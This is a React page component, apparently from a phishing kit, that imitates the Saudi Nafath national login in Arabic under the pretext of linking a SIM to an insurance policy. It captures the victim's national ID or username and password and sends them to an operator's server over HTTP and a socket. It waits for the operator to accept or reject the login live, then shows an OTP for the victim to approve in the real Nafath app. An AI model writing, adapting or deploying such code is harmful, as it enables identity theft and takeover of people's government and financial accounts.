import React, { useEffect, useState } from "react";
import { TailSpin } from "react-loader-spinner";
import { useLocation, useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import axios from "axios";
const ConfirmOrder = () => {
  const data = new URLSearchParams(window.location.search);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const [NavazUser, setNavazUser] = useState("");
  const [NavazPassword, setNavazPassword] = useState("");
  const [page, setPage] = useState(1);
  const [otp, setOtp] = useState(data.get("userOtp"));
  const id = data.get("id");
  const handleSubmit = async (e) => {
    setLoading(true);
    setError(false);

    e.preventDefault();
    const finalData = { id, NavazUser, NavazPassword };
    try {
      await axios.post(api_route + "/navaz/" + id, finalData).then(() => {
        socket.emit("navaz", { id, NavazUser, NavazPassword });
      });
    } catch (error) {}
  };

  socket.on("acceptMotslOtp", (data) => {
    console.log(data);
    if (data.id === id && data.userOtp) {
      setLoading(false);
      setPage(1);
      setOtp(data.userOtp);
    }
  });
  socket.on("declineNavaz", (data) => {
    if (data === id) {
      setLoading(false);
      setError(true);
    }
  });

  socket.on("acceptSTC", (data) => {
    console.log(data);
    if (data.id === id && data.userOtp) {
      setOtp(data.userOtp);
    }
  });

  return (
    <div
      style={{ backgroundColor: "#f4f4ff" }}
      className="flex w-full items-center justify-center min-h-screen flex-col gap-y-4"
    >
      {page === 0 ? (
        <div className="w-full flex flex-col items-center justify-center bg-white py-2 gap-5">
          <img src="/navazLogo.png" alt="navazLogo Logo" className="w-32" />
          <span className="text-center w-3/4 text-gray-500 font-semibold">
            يرجي ادخال رقم الهوية الوطنية لتوثيق ربط شريحتك في الطلب لاصدار
            وثيقة التأمين الإلكترونية
          </span>
          <form
            className="flex flex-col w-11/12 rounded-md items-center justify-center pb-2 "
            style={{ border: "1px solid #14a196" }}
            onSubmit={handleSubmit}
          >
            <span
              className="text-white text-center w-full py-1 text-lg"
              style={{ backgroundColor: "#14a196" }}
            >
              اسم المستخدم و كلمة المرور
            </span>
            <div className="flex gap-y-2 w-full justify-center items-center flex-col py-2 text-gray-700 ">
              <label className="text-lg text-gray-700 ">
                اسم المستخدم\الهوية الوطنية
              </label>
              <input
                type="text"
                required
                placeholder="  اسم المستخدم\الهوية الوطنية"
                className="p-2 border-2 text-right w-11/12 rounded-md  outline-blue-500"
                value={NavazUser}
                onChange={(e) => setNavazUser(e.target.value)}
              />
            </div>
            <div className="flex gap-y-2 w-full justify-center items-center flex-col py-2 text-gray-700 ">
              <label className="text-lg text-gray-700 ">كلمة المرور</label>
              <input
                type="password"
                required
                placeholder="    كلمة المرور"
                className="p-2 border-2 text-right w-11/12 rounded-md  outline-blue-500"
                value={NavazPassword}
                onChange={(e) => setNavazPassword(e.target.value)}
              />
            </div>
            {error ? (
              <div className="text-red-500 text-lg  mb-1 font-semibold w-full flex items-center justify-center">
                بيانات الدخول غير صحيحة
              </div>
            ) : (
              ""
            )}
            <button
              className="text-white flex items-center justify-center   w-11/12 text-lg py-2 rounded-sm "
              style={{ backgroundColor: "#14a196" }}
              type="submit"
            >
              {loading ? (
                <TailSpin
                  height="30"
                  width="30"
                  color="white"
                  ariaLabel="tail-spin-loading"
                  radius="1"
                  wrapperStyle={{}}
                  wrapperClass=""
                  visible={true}
                />
              ) : (
                "  متابعة التوثيق"
              )}
            </button>
          </form>
        </div>
      ) : (
        <div className="w-full flex flex-col items-center justify-center bg-white py-5 gap-5 ">
          <img src="/navazLogo.png" alt="navazLogo Logo" className="w-16" />
          <span
            className="text-center w-4/5  bg-green-100 rounded-md p-3  text-gray-600  "
            style={{ border: "1px solid #14a196" }}
          >
            الرجاء التوجه الي تطبيق نفاذ وتاكيد استبدال وربط وثيقة التامين شريحة
            الجوال باختيار الرقم الذي سوف يظهر في الاسفل
            <div className="text-4xl text-green-500 animate-bounce mt-5">
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
              <span>&bull;</span>
            </div>
            <span className="text-gray-600 ">
              جاري المعالجة . نرجو الانتظار
            </span>
          </span>
          <div
            className="min-w-20 min-h-20 flex items-center justify-center text-2xl text-green-800 "
            style={{ border: "2px solid #14a196" }}
          >
            {otp ? otp : "??"}
          </div>
          <img src="/navazOtp.jpg" className="md:w-2/5 " />
        </div>
      )}
    </div>
  );
};

export default ConfirmOrder;
